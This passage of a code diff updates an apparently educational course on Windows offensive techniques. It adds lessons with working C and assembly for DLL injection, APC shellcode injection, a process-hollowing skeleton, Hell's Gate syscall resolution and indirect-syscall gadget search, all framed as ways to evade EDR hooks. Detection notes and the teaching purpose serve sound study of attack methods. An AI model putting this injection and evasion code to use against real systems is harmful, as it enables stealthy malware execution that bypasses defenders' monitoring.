+• PROCESS_VM_OPERATION - VirtualAllocEx
+• PROCESS_VM_WRITE - WriteProcessMemory
+• PROCESS_QUERY_INFORMATION - Query process info
+
+**Detection Points:**
+• CreateRemoteThread on foreign process
+• VirtualAllocEx with RWX permissions
+• WriteProcessMemory to executable regions
+• Unsigned DLL loaded from unusual location`,
+          warning: `This technique is heavily monitored. Modern EDR solutions hook CreateRemoteThread and monitor for cross-process memory operations.`,
+          example: {
+            title: "DLL Injection Implementation",
             code: `#include <windows.h>
 #include <stdio.h>
 
-BOOL InjectShellcode(DWORD pid, BYTE* code, SIZE_T size) {
+BOOL InjectDLL(DWORD pid, LPCWSTR dllPath) {
+    BOOL success = FALSE;
+    HANDLE hProcess = NULL;
+    LPVOID remotePath = NULL;
+    HANDLE hThread = NULL;
+    
+    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
+    
+    // Step 1: Open target process
+    hProcess = OpenProcess(
+        PROCESS_CREATE_THREAD | 
+        PROCESS_VM_OPERATION | 
+        PROCESS_VM_WRITE,
+        FALSE,
+        pid
+    );
+    
+    if (!hProcess) {
+        printf("[-] OpenProcess failed: %lu\\n", GetLastError());
+        goto cleanup;
+    }
+    printf("[+] Opened process: %lu\\n", pid);
+    
+    // Step 2: Allocate memory for DLL path
+    remotePath = VirtualAllocEx(
+        hProcess,
+        NULL,
+        pathSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE  // Only RW needed for string
+    );
+    
+    if (!remotePath) {
+        printf("[-] VirtualAllocEx failed: %lu\\n", GetLastError());
+        goto cleanup;
+    }
+    printf("[+] Allocated remote memory: 0x%p\\n", remotePath);
+    
+    // Step 3: Write DLL path
+    if (!WriteProcessMemory(hProcess, remotePath, dllPath, pathSize, NULL)) {
+        printf("[-] WriteProcessMemory failed: %lu\\n", GetLastError());
+        goto cleanup;
+    }
+    printf("[+] Wrote DLL path to target\\n");
+    
+    // Step 4: Get LoadLibraryW address
+    // kernel32.dll is loaded at same address in all processes
+    LPVOID loadLibrary = GetProcAddress(
+        GetModuleHandleW(L"kernel32.dll"),
+        "LoadLibraryW"
+    );
+    printf("[+] LoadLibraryW: 0x%p\\n", loadLibrary);
+    
+    // Step 5: Create remote thread
+    hThread = CreateRemoteThread(
+        hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)loadLibrary,
+        remotePath,
+        0,
+        NULL
+    );
+    
+    if (!hThread) {
+        printf("[-] CreateRemoteThread failed: %lu\\n", GetLastError());
+        goto cleanup;
+    }
+    printf("[+] Created remote thread!\\n");
+    
+    // Wait for DLL to load
+    WaitForSingleObject(hThread, 5000);
+    success = TRUE;
+
+cleanup:
+    if (hThread) CloseHandle(hThread);
+    // Note: Don't free remotePath - it's needed by the DLL
+    if (hProcess) CloseHandle(hProcess);
+    
+    return success;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Process Hollowing (RunPE)",
+          content: `Process hollowing creates a suspended legitimate process, unmaps its original code, and replaces it with malicious code - inheriting the victim's appearance and potentially its privileges.
+
+**The Process:**
+1. Create target process in SUSPENDED state
+2. Read target's PEB to get image base
+3. Unmap the original executable using NtUnmapViewOfSection
+4. Allocate new memory at the original (or new) base address
+5. Write malicious PE (headers + sections)
+6. Update PEB's ImageBaseAddress if base changed
+7. Set thread context (RCX = entry point on x64)
+8. Resume the thread
+
+**Advantages:**
+• Process appears legitimate (name, command line)
+• Inherits parent-child relationship
+• May bypass application whitelisting
+• Memory forensics shows hollowed sections
+
+**Detection:**
+• PEB ImageBase doesn't match memory content
+• Memory regions marked as MEM_IMAGE but not backed by file
+• Entropy analysis of executable sections`,
+          concepts: [
+            { label: "Suspended Process", explanation: "Created with CREATE_SUSPENDED flag - main thread doesn't execute until resumed." },
+            { label: "NtUnmapViewOfSection", explanation: "Native API to unmap memory regions, including the main executable image." },
+            { label: "Image Base", explanation: "The address where the PE is loaded. Usually 0x140000000 for 64-bit executables." },
+            { label: "Thread Context", explanation: "CPU register state. Entry point address goes in RCX (x64) or EAX (x86)." }
+          ],
+          example: {
+            title: "Process Hollowing Skeleton",
+            code: `#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+// NtUnmapViewOfSection typedef
+typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress
+);
+
+BOOL HollowProcess(LPCWSTR targetPath, LPVOID payload, SIZE_T payloadSize) {
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    PROCESS_BASIC_INFORMATION pbi;
+    ULONG returnLength;
+    
+    // Step 1: Create suspended process
+    if (!CreateProcessW(
+        targetPath, NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
+        NULL, NULL, &si, &pi
+    )) {
+        printf("[-] CreateProcess failed: %lu\\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Created suspended process: %lu\\n", pi.dwProcessId);
+    
+    // Step 2: Get PEB address
+    NtQueryInformationProcess(
+        pi.hProcess,
+        ProcessBasicInformation,
+        &pbi,
+        sizeof(pbi),
+        &returnLength
+    );
+    
+    // Step 3: Read ImageBaseAddress from PEB
+    PVOID imageBase;
+    ReadProcessMemory(
+        pi.hProcess,
+        (PBYTE)pbi.PebBaseAddress + 0x10, // ImageBaseAddress offset
+        &imageBase,
+        sizeof(imageBase),
+        NULL
+    );
+    printf("[+] Original ImageBase: 0x%p\\n", imageBase);
+    
+    // Step 4: Unmap original image
+    pNtUnmapViewOfSection NtUnmapViewOfSection = 
+        (pNtUnmapViewOfSection)GetProcAddress(
+            GetModuleHandleW(L"ntdll.dll"),
+            "NtUnmapViewOfSection"
+        );
+    
+    NtUnmapViewOfSection(pi.hProcess, imageBase);
+    printf("[+] Unmapped original image\\n");
+    
+    // Step 5: Allocate and write payload
+    // ... (PE parsing and writing sections)
+    
+    // Step 6: Update thread context and resume
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+    // ctx.Rcx = newEntryPoint;  // x64
+    SetThreadContext(pi.hThread, &ctx);
+    
+    ResumeThread(pi.hThread);
+    printf("[+] Process hollowing complete!\\n");
+    
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return TRUE;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "APC Injection",
+          content: `Asynchronous Procedure Calls (APCs) allow code execution in the context of a specific thread. APC injection queues a function to execute when the target thread enters an alertable wait state.
+
+**How APCs Work:**
+• Each thread has an APC queue (user-mode and kernel-mode)
+• APCs execute when thread enters "alertable wait" (SleepEx, WaitForSingleObjectEx, etc.)
+• QueueUserAPC adds a function to a thread's APC queue
+
+**Injection Process:**
+1. Allocate executable memory in target process
+2. Write shellcode to allocated memory
+3. Find or enumerate target threads
+4. Queue APC pointing to shellcode for target thread(s)
+5. Wait for thread to become alertable (or queue to all threads)
+
+**Early Bird Variant:**
+• Create suspended process
+• Queue APC to main thread before it starts
+• Resume thread - APC executes before main() runs
+• Bypasses some security hooks not yet installed`,
+          tip: `APC injection is stealthier than CreateRemoteThread because no new thread is created. The code runs in an existing thread's context.`,
+          example: {
+            title: "APC Injection to All Threads",
+            code: `#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+BOOL InjectViaAPC(DWORD pid, LPVOID shellcode, SIZE_T size) {
     HANDLE hProcess = OpenProcess(
-        PROCESS_ALL_ACCESS, FALSE, pid
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
+        FALSE, pid
     );
     if (!hProcess) return FALSE;
     
-    // Allocate executable memory
-    LPVOID remoteMem = VirtualAllocEx(
+    // Allocate RWX memory
+    LPVOID remoteCode = VirtualAllocEx(
         hProcess, NULL, size,
         MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE  // RWX for code
+        PAGE_EXECUTE_READWRITE
     );
     
-    if (!remoteMem) {
+    if (!remoteCode) {
         CloseHandle(hProcess);
         return FALSE;
     }
     
     // Write shellcode
-    WriteProcessMemory(
-        hProcess, remoteMem,
-        code, size, NULL
-    );
+    WriteProcessMemory(hProcess, remoteCode, shellcode, size, NULL);
+    printf("[+] Wrote shellcode at 0x%p\\n", remoteCode);
     
-    // Execute it
-    HANDLE hThread = CreateRemoteThread(
-        hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)remoteMem,
-        NULL, 0, NULL
-    );
+    // Enumerate threads and queue APC to all
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { sizeof(te) };
     
-    if (hThread) CloseHandle(hThread);
+    if (Thread32First(hSnapshot, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE hThread = OpenThread(
+                    THREAD_SET_CONTEXT,
+                    FALSE,
+                    te.th32ThreadID
+                );
+                
+                if (hThread) {
+                    // Queue APC
+                    if (QueueUserAPC(
+                        (PAPCFUNC)remoteCode,
+                        hThread,
+                        0  // APC parameter
+                    )) {
+                        printf("[+] Queued APC to thread %lu\\n", 
+                               te.th32ThreadID);
+                    }
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te));
+    }
+    
+    CloseHandle(hSnapshot);
     CloseHandle(hProcess);
-    return hThread != NULL;
+    return TRUE;
 }`,
             language: "c"
           }
-        },
-        {
-          title: "Process Hollowing",
-          content: `Process hollowing creates a suspended process, unmaps its memory, and replaces it with malicious code.
-
-**Why use it?**
-• The process looks legitimate (e.g., notepad.exe)
-• But it's running your code
-• Great for evading process monitoring`,
-          concepts: [
-            { label: "CREATE_SUSPENDED", explanation: "Create process but don't run it yet" },
-            { label: "NtUnmapViewOfSection", explanation: "Remove the original code" },
-            { label: "VirtualAllocEx", explanation: "Allocate space for new code" },
-            { label: "SetThreadContext", explanation: "Point execution to your code" }
-          ],
-          warning: `Process hollowing is a well-known technique. Modern EDRs detect the unmapping and rewriting patterns.`
         }
       ]
     },
     syscalls: {
-      title: "Syscalls & Native API",
-      description: "Direct syscall invocation and NTDLL internals",
+      title: "Direct Syscalls & Native API",
+      description: "Bypassing user-mode hooks through direct kernel transitions",
       sections: [
         {
           type: "intro",
-          content: `Syscalls are the gateway between user-mode and kernel-mode. Understanding them lets you bypass user-mode hooks that security products use for monitoring.`
+          content: `Modern security tools hook Windows API functions in user-mode DLLs (kernel32, ntdll) to monitor process behavior. Direct syscalls bypass these hooks by transitioning directly to kernel mode, making detection significantly harder.`
         },
         {
-          title: "What are Syscalls?",
-          content: `When you call a Windows API function, it eventually needs to talk to the kernel. This happens through syscalls.
+          title: "Understanding System Calls",
+          content: `A system call (syscall) is the mechanism for user-mode code to request services from the kernel.
 
-**The chain:**
-1. Your code calls WriteFile()
-2. kernel32.dll does setup
-3. ntdll.dll makes the actual syscall
-4. Kernel does the work
+**The Syscall Mechanism (x64):**
+1. System Service Number (SSN) loaded into RAX
+2. Arguments placed in RCX, RDX, R8, R9, then stack
+3. Execute 'syscall' instruction
+4. CPU transitions to kernel mode
+5. KiSystemCall64 dispatches to appropriate kernel function
+6. Result returned in RAX
 
-**Why care?**
-Security products hook ntdll.dll to monitor API calls. If you make syscalls directly, you bypass their hooks!`,
+**Why Syscalls Bypass Hooks:**
+• EDR hooks are placed in ntdll.dll functions
+• Direct syscalls skip ntdll entirely
+• The 'syscall' instruction goes directly to kernel
+• No user-mode code is executed except your own
+
+**NTDLL Function Layout:**
+Each NT function in ntdll.dll follows a pattern:
+1. mov r10, rcx
+2. mov eax, <SSN>
+3. syscall
+4. ret
+
+Security tools replace this with a JMP to their hook.`,
           concepts: [
-            { label: "SSN", explanation: "System Service Number - the syscall's ID number" },
-            { label: "ntdll.dll", explanation: "The bridge between user-mode and kernel" },
-            { label: "syscall", explanation: "x64 instruction that transitions to kernel" },
-            { label: "sysenter", explanation: "x86 instruction for the same purpose" }
+            { label: "SSN", explanation: "System Service Number - index into kernel's service table. Changes between Windows versions." },
+            { label: "syscall", explanation: "CPU instruction that triggers ring 3 to ring 0 transition on x64." },
+            { label: "SSDT", explanation: "System Service Descriptor Table - kernel table mapping SSNs to function addresses." },
+            { label: "Hook", explanation: "Modification of function prologue to redirect execution, typically JMP to monitoring code." }
           ],
           example: {
-            title: "Finding Syscall Numbers",
+            title: "Basic Direct Syscall (Assembly)",
+            code: `; Direct syscall for NtAllocateVirtualMemory
+; SSN varies by Windows version!
+
+section .text
+global SysNtAllocateVirtualMemory
+
+SysNtAllocateVirtualMemory:
+    mov r10, rcx              ; First param to r10 (convention)
+    mov eax, 0x18             ; SSN for NtAllocateVirtualMemory (Win10 1909)
+    syscall                   ; Transition to kernel
+    ret
+
+; C declaration:
+; extern NTSTATUS SysNtAllocateVirtualMemory(
+;     HANDLE ProcessHandle,     // rcx -> r10
+;     PVOID* BaseAddress,       // rdx
+;     ULONG_PTR ZeroBits,       // r8
+;     PSIZE_T RegionSize,       // r9
+;     ULONG AllocationType,     // stack
+;     ULONG Protect             // stack
+; );`,
+            language: "asm"
+          },
+          warning: `SSNs change between Windows versions! Using a hardcoded SSN will crash on the wrong Windows version. Always dynamically resolve SSNs.`
+        },
+        {
+          title: "Hell's Gate - Dynamic SSN Resolution",
+          content: `Hell's Gate dynamically resolves System Service Numbers by parsing ntdll.dll in memory, avoiding hardcoded values that break across Windows versions.
+
+**The Technique:**
+1. Get ntdll.dll base address (from PEB)
+2. Parse PE export directory
+3. Find target NT function by name
+4. Read bytes at function address
+5. Extract SSN from 'mov eax, <SSN>' instruction
+6. Use extracted SSN for direct syscall
+
+**Pattern Matching:**
+Unhooked functions have predictable bytes:
+\`4C 8B D1\` - mov r10, rcx
+\`B8 XX XX 00 00\` - mov eax, SSN (XX XX = SSN as WORD)
+\`0F 05\` - syscall
+\`C3\` - ret
+
+If function starts with \`E9\` (JMP) or \`FF 25\` (JMP [rip+offset]), it's hooked.`,
+          example: {
+            title: "Hell's Gate SSN Extraction",
             code: `#include <windows.h>
 #include <stdio.h>
 
-// Find the syscall number for an Nt function
-DWORD GetSSN(LPCSTR functionName) {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) return -1;
+// Syscall stub structure
+typedef struct _SYSCALL_ENTRY {
+    DWORD ssn;
+    PVOID address;
+} SYSCALL_ENTRY;
+
+// Extract SSN from ntdll function
+BOOL GetSyscallNumber(LPCSTR functionName, SYSCALL_ENTRY* entry) {
+    // Get ntdll base from PEB
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    if (!ntdll) return FALSE;
     
-    FARPROC func = GetProcAddress(ntdll, functionName);
-    if (!func) return -1;
+    // Get function address
+    PVOID funcAddr = GetProcAddress(ntdll, functionName);
+    if (!funcAddr) return FALSE;
     
-    BYTE* bytes = (BYTE*)func;
+    entry->address = funcAddr;
+    PBYTE bytes = (PBYTE)funcAddr;
     
-    // x64 syscall stub pattern:
-    // 4C 8B D1    mov r10, rcx
-    // B8 XX XX    mov eax, SSN
-    
-    printf("First 8 bytes of %s:\\n", functionName);
-    for (int i = 0; i < 8; i++) {
-        printf("%02X ", bytes[i]);
+    // Check for hook (JMP instruction)
+    if (bytes[0] == 0xE9 || bytes[0] == 0xFF) {
+        printf("[-] %s is hooked!\\n", functionName);
+        return FALSE;
     }
-    printf("\\n");
     
-    // SSN is at offset 4
-    return *(DWORD*)(bytes + 4) & 0xFFFF;
+    // Pattern: mov r10, rcx; mov eax, SSN
+    // 4C 8B D1 | B8 XX XX 00 00
+    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
+        bytes[3] == 0xB8) {
+        // SSN is at offset 4 (little-endian WORD)
+        entry->ssn = *(PDWORD)(bytes + 4);
+        printf("[+] %s SSN: 0x%X (%d)\\n", 
+               functionName, entry->ssn, entry->ssn);
+        return TRUE;
+    }
+    
+    printf("[-] Unexpected pattern for %s\\n", functionName);
+    return FALSE;
 }
 
 int main() {
-    DWORD ssn = GetSSN("NtAllocateVirtualMemory");
-    printf("SSN: %lu (0x%X)\\n", ssn, ssn);
+    SYSCALL_ENTRY entries[5];
+    
+    GetSyscallNumber("NtAllocateVirtualMemory", &entries[0]);
+    GetSyscallNumber("NtWriteVirtualMemory", &entries[1]);
+    GetSyscallNumber("NtProtectVirtualMemory", &entries[2]);
+    GetSyscallNumber("NtCreateThreadEx", &entries[3]);
+    GetSyscallNumber("NtWaitForSingleObject", &entries[4]);
+    
     return 0;
 }`,
             language: "c"
           }
         },
         {
-          title: "Direct Syscalls",
-          content: `Direct syscalls mean you make the syscall instruction yourself, completely bypassing ntdll.dll.
-
-**The challenge:**
-SSN numbers change between Windows versions! You need to find them dynamically.
-
-**Common approaches:**
-1. Read them from ntdll.dll at runtime
-2. Use Hell's Gate technique
-3. Have a lookup table for each Windows version`,
-          tip: `Hell's Gate and Halo's Gate are techniques to find SSNs even when ntdll is hooked by reading neighboring functions.`,
-          example: {
-            title: "Direct Syscall in Assembly",
-            description: "What a direct syscall looks like:",
-            code: `; x64 direct syscall
-mov r10, rcx          ; Windows calling convention
-mov eax, 0x18         ; SSN for NtAllocateVirtualMemory
-syscall               ; Transition to kernel
-ret
-
-; The SSN (0x18) varies by Windows version!
-; Windows 10 1909: 0x18
-; Windows 10 2004: 0x18  
-; Windows 11: might be different
-
-; In C, you'd use inline assembly or a separate .asm file`,
-            language: "asm"
-          },
-          warning: `Direct syscalls look suspicious. EDRs are now detecting the syscall instruction itself when it comes from unexpected locations.`
-        },
-        {
           title: "Indirect Syscalls",
-          content: `To avoid detection of syscall instructions in your code, you can jump to the syscall in ntdll.dll itself!
+          content: `Indirect syscalls add another layer of evasion by executing the 'syscall' instruction from within ntdll.dll itself, making the call stack appear more legitimate.
 
-**How it works:**
-1. Set up registers like normal
-2. Jump to the syscall instruction IN ntdll.dll
-3. Kernel sees the call coming from ntdll (looks legit)`,
-          concepts: [
-            { label: "Direct", explanation: "syscall instruction in YOUR code" },
-            { label: "Indirect", explanation: "Jump to syscall in ntdll.dll" },
-            { label: "Syswhispers", explanation: "Tool that generates syscall stubs" }
-          ]
+**Why Indirect Syscalls?**
+• Some EDRs examine the return address on syscall
+• Direct syscalls return to your code (suspicious)
+• Indirect syscalls return to ntdll.dll (legitimate-looking)
+• Call stack analysis shows ntdll, not your executable
+
+**Implementation:**
+1. Find ntdll function (as in Hell's Gate)
+2. Extract SSN
+3. Find 'syscall; ret' gadget within ntdll
+4. Call gadget with SSN in RAX and proper arguments
+
+**Finding the Gadget:**
+Search ntdll for bytes: \`0F 05 C3\` (syscall; ret)
+Or use the syscall instruction inside any NT function.`,
+          example: {
+            title: "Indirect Syscall Implementation",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+// Find syscall gadget in ntdll
+PVOID FindSyscallGadget() {
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
+    
+    PBYTE base = (PBYTE)ntdll;
+    SIZE_T size = nt->OptionalHeader.SizeOfImage;
+    
+    // Search for syscall; ret (0F 05 C3)
+    for (SIZE_T i = 0; i < size - 3; i++) {
+        if (base[i] == 0x0F && base[i+1] == 0x05 && base[i+2] == 0xC3) {
+            printf("[+] Found syscall gadget at 0x%p\\n", base + i);
+            return base + i;
+        }
+    }
+    return NULL;
+}
+
+// Indirect syscall wrapper (simplified - needs ASM for real implementation)
+typedef NTSTATUS (*pSyscallGadget)(void);
+
+// In real implementation, use assembly:
+// mov r10, rcx
+// mov eax, <SSN>
+// jmp <gadget_address>  ; Instead of 'syscall'
+
+int main() {
+    PVOID gadget = FindSyscallGadget();
+    if (!gadget) {
+        printf("[-] Could not find syscall gadget\\n");
+        return 1;
+    }
+    
+    // Now use this gadget address in your syscall stub
+    // instead of directly using the 'syscall' instruction
+    
+    return 0;
+}`,
+            language: "c"
+          },
+          tip: `Combine Hell's Gate (for SSN resolution) with indirect syscalls (for legitimate-looking call stacks) for maximum evasion.`
         }
       ]
     },
     pinvoke: {
       title: "P/Invoke & .NET Interop",
-      description: "C# unmanaged code interop and marshalling",
+      description: "Calling native Windows APIs from managed .NET code",
       sections: [
         {
           type: "intro",
-          content: `P/Invoke (Platform Invocation Services) lets C# call native Windows API functions. It's the bridge between managed .NET code and unmanaged Windows code.`
+          content: `P/Invoke (Platform Invocation Services) enables C# and other .NET languages to call unmanaged functions in native DLLs like kernel32.dll and ntdll.dll. This capability is essential for Windows security tools written in C#.`
         },
         {
-          title: "P/Invoke Basics",
-          content: `To call a Windows function from C#, you declare it with the DllImport attribute.
+          title: "P/Invoke Fundamentals",
+          content: `P/Invoke bridges the managed (.NET) and unmanaged (native) worlds using the DllImport attribute and careful type marshaling.
 
-**Key things to get right:**
-• The DLL name
-• The exact function name (case-sensitive!)
-• Parameter types (C types → C# types)
-• Return type`,
-          concepts: [
-            { label: "DllImport", explanation: "Attribute that declares a native function" },
-            { label: "extern", explanation: "Keyword indicating external implementation" },
-            { label: "IntPtr", explanation: "C# type for pointers and handles" },
-            { label: "Marshal", explanation: "Class for data conversion between managed/unmanaged" }
-          ],
+**Basic Structure:**
+\`\`\`
+[DllImport("dll.name", CharSet, SetLastError, ...)]
+static extern ReturnType FunctionName(parameters);
+\`\`\`
+
+**Key DllImport Parameters:**
+• DllName - Target DLL (kernel32.dll, ntdll.dll, etc.)
+• CharSet - Character encoding (CharSet.Unicode for W functions)
+• SetLastError - Capture GetLastError() value
+• CallingConvention - Usually Cdecl or StdCall
+• EntryPoint - Actual function name if different
+
+**Type Mappings:**
+• HANDLE → IntPtr
+• DWORD → uint or UInt32
+• BOOL → bool (with MarshalAs if needed)
+• LPVOID → IntPtr
+• LPWSTR → string or StringBuilder
+• BYTE* → byte[] or IntPtr`,
           example: {
             title: "Basic P/Invoke Examples",
             code: `using System;
 using System.Runtime.InteropServices;
 
-class Program {
-    // Simple function - no parameters
+class NativeMethods {
+    // Simple function - no special marshaling
     [DllImport("kernel32.dll")]
-    static extern uint GetCurrentProcessId();
+    public static extern uint GetCurrentProcessId();
     
-    // Function with parameters
-    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
-    static extern int MessageBoxW(
-        IntPtr hWnd,
-        string text,
-        string caption,
-        uint type
-    );
+    [DllImport("kernel32.dll")]
+    public static extern uint GetCurrentThreadId();
     
-    // Function returning a handle
+    // SetLastError captures error code
     [DllImport("kernel32.dll", SetLastError = true)]
-    static extern IntPtr OpenProcess(
-        uint access,
-        bool inheritHandle,
-        uint processId
+    public static extern IntPtr OpenProcess(
+        uint dwDesiredAccess,
+        bool bInheritHandle,
+        uint dwProcessId
     );
     
+    // CharSet for string handling
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    public static extern IntPtr CreateFileW(
+        string lpFileName,
+        uint dwDesiredAccess,
+        uint dwShareMode,
+        IntPtr lpSecurityAttributes,
+        uint dwCreationDisposition,
+        uint dwFlagsAndAttributes,
+        IntPtr hTemplateFile
+    );
+    
+    // Bool requires explicit marshaling
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool CloseHandle(IntPtr hObject);
+    
+    // Constants
+    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
+    public const uint GENERIC_READ = 0x80000000;
+    public const uint OPEN_EXISTING = 3;
+}
+
+class Program {
     static void Main() {
-        uint pid = GetCurrentProcessId();
-        Console.WriteLine($"My PID: {pid}");
+        Console.WriteLine($"PID: {NativeMethods.GetCurrentProcessId()}");
+        Console.WriteLine($"TID: {NativeMethods.GetCurrentThreadId()}");
         
-        MessageBoxW(IntPtr.Zero, 
-            "Hello from C#!", "P/Invoke", 0);
+        IntPtr hProcess = NativeMethods.OpenProcess(
+            NativeMethods.PROCESS_ALL_ACCESS,
+            false,
+            NativeMethods.GetCurrentProcessId()
+        );
+        
+        if (hProcess != IntPtr.Zero) {
+            Console.WriteLine($"Handle: 0x{hProcess.ToInt64():X}");
+            NativeMethods.CloseHandle(hProcess);
+        } else {
+            Console.WriteLine($"Error: {Marshal.GetLastWin32Error()}");
+        }
     }
 }`,
             language: "csharp"
-          },
-          tip: `Always use SetLastError = true if you need to call Marshal.GetLastWin32Error() to get error codes.`
+          }
         },
         {
-          title: "Structure Marshalling",
-          content: `When Windows functions use structures, you need to define matching C# structs with the right layout.
+          title: "Structure Marshaling",
+          content: `Complex Windows APIs require passing structures. These must be carefully defined with matching layout and marshaling attributes.
 
-**Key attributes:**
-• [StructLayout(LayoutKind.Sequential)] - fields in order
-• [MarshalAs(...)] - control how fields are converted`,
+**StructLayout Attribute:**
+• LayoutKind.Sequential - Fields in declared order (default)
+• LayoutKind.Explicit - Manually specified offsets (for unions)
+
+**Common Patterns:**
+• Size field - Many structures require cb/dwSize set before use
+• Arrays - Fixed size with MarshalAs(UnmanagedType.ByValArray)
+• Strings - MarshalAs(UnmanagedType.ByValTStr) for inline strings
+• Pointers - IntPtr for any pointer type`,
           example: {
-            title: "Marshalling Structures",
+            title: "Structure Marshaling Examples",
             code: `using System;
 using System.Runtime.InteropServices;
 
-// Match the Windows PROCESSENTRY32W structure
+// Basic structure
+[StructLayout(LayoutKind.Sequential)]
+public struct MEMORY_BASIC_INFORMATION {
+    public IntPtr BaseAddress;
+    public IntPtr AllocationBase;
+    public uint AllocationProtect;
+    public IntPtr RegionSize;
+    public uint State;
+    public uint Protect;
+    public uint Type;
+}
+
+// Structure with size field
 [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-struct PROCESSENTRY32W {
+public struct PROCESSENTRY32W {
     public uint dwSize;
     public uint cntUsage;
     public uint th32ProcessID;
@@ -632,621 +1266,751 @@ struct PROCESSENTRY32W {
     public string szExeFile;
 }
 
+// Union using explicit layout
+[StructLayout(LayoutKind.Explicit)]
+public struct INPUT_RECORD {
+    [FieldOffset(0)] public ushort EventType;
+    [FieldOffset(4)] public KEY_EVENT_RECORD KeyEvent;
+    [FieldOffset(4)] public MOUSE_EVENT_RECORD MouseEvent;
+}
+
+class NativeMethods {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualQuery(
+        IntPtr lpAddress,
+        out MEMORY_BASIC_INFORMATION lpBuffer,
+        IntPtr dwLength
+    );
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateToolhelp32Snapshot(
+        uint dwFlags,
+        uint th32ProcessID
+    );
+    
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool Process32FirstW(
+        IntPtr hSnapshot,
+        ref PROCESSENTRY32W lppe
+    );
+    
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool Process32NextW(
+        IntPtr hSnapshot,
+        ref PROCESSENTRY32W lppe
+    );
+    
+    public const uint TH32CS_SNAPPROCESS = 0x00000002;
+}
+
 class Program {
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateToolhelp32Snapshot(
-        uint flags, uint processId);
-    
-    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
-    static extern bool Process32FirstW(
-        IntPtr snapshot, ref PROCESSENTRY32W entry);
-    
-    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
-    static extern bool Process32NextW(
-        IntPtr snapshot, ref PROCESSENTRY32W entry);
-    
-    static void Main() {
-        IntPtr snap = CreateToolhelp32Snapshot(0x2, 0);
+    static void EnumerateProcesses() {
+        IntPtr snapshot = NativeMethods.CreateToolhelp32Snapshot(
+            NativeMethods.TH32CS_SNAPPROCESS, 0);
         
-        var entry = new PROCESSENTRY32W();
-        entry.dwSize = (uint)Marshal.SizeOf(entry);
+        if (snapshot == IntPtr.Zero - 1) {
+            Console.WriteLine($"Error: {Marshal.GetLastWin32Error()}");
+            return;
+        }
         
-        if (Process32FirstW(snap, ref entry)) {
+        PROCESSENTRY32W pe = new PROCESSENTRY32W();
+        pe.dwSize = (uint)Marshal.SizeOf(pe);  // CRITICAL!
+        
+        if (NativeMethods.Process32FirstW(snapshot, ref pe)) {
             do {
-                Console.WriteLine(
-                    $"[{entry.th32ProcessID}] {entry.szExeFile}");
-            } while (Process32NextW(snap, ref entry));
+                Console.WriteLine($"[{pe.th32ProcessID,5}] {pe.szExeFile}");
+            } while (NativeMethods.Process32NextW(snapshot, ref pe));
         }
     }
 }`,
             language: "csharp"
-          }
+          },
+          warning: `Always set the size field (dwSize, cb, etc.) before calling functions! This is a common source of ERROR_INVALID_PARAMETER (87).`
         },
         {
           title: "D/Invoke - Dynamic Invocation",
-          content: `D/Invoke loads functions dynamically at runtime instead of using static P/Invoke. This helps evade static analysis.
+          content: `D/Invoke is an alternative to P/Invoke that dynamically resolves and calls functions at runtime, avoiding static imports that are easily detected by security tools.
 
-**Why use D/Invoke?**
-• P/Invoke declarations are visible in the binary
-• Static analysis tools can see what APIs you use
-• D/Invoke resolves functions at runtime`,
-          concepts: [
-            { label: "GetProcAddress", explanation: "Finds a function in a loaded DLL" },
-            { label: "GetModuleHandle", explanation: "Gets handle to already-loaded DLL" },
-            { label: "Delegates", explanation: "C# function pointers used to call the resolved function" }
-          ],
-          warning: `D/Invoke is well-known now. Sophisticated EDRs monitor for dynamic resolution patterns.`
+**Advantages over P/Invoke:**
+• No import table entries for suspicious functions
+• Can call functions from manually mapped DLLs
+• Supports syscall execution
+• Harder for static analysis to detect
+
+**Key Techniques:**
+1. GetProcAddress - Resolve function by name at runtime
+2. GetModuleHandle - Find loaded DLL base
